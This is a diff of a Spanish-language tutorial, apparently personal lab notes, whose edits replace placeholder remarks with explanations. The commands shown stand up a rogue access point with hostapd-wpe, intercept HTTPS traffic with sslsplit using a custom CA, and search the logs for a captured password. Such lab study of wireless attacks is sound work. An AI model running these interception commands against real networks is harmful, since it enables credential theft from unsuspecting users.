@@ -154,7 +154,7 @@ sudo airmon-ng check kill
 sudo airmon-ng check
 ```
 
-*AQUI NO SE LO QUE HACE.*
+Ejecutamos el comando junto con nuestro script.
 ```
 sudo hostapd-wpe host.conf
 ```
@@ -207,17 +207,20 @@ mkdir /tmp/sslsplit
 cd
 cd pruebas/sslsplit
 ```
+
 Ejecutamos en otra consola este comando:
 ```
 sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
 ```
+
 Y en otra terminal:
 ```
 cd
 cd pruebas/sslsplit
 tail -f connections.log
 ```
-*BUSCAMOS LA PASS?? MEDIANTE EL FILTRO??*
+
+Buscamos la contraseña mediante un filtro.
 ```
 cd
 cd pruebas/sslsplit/logdir
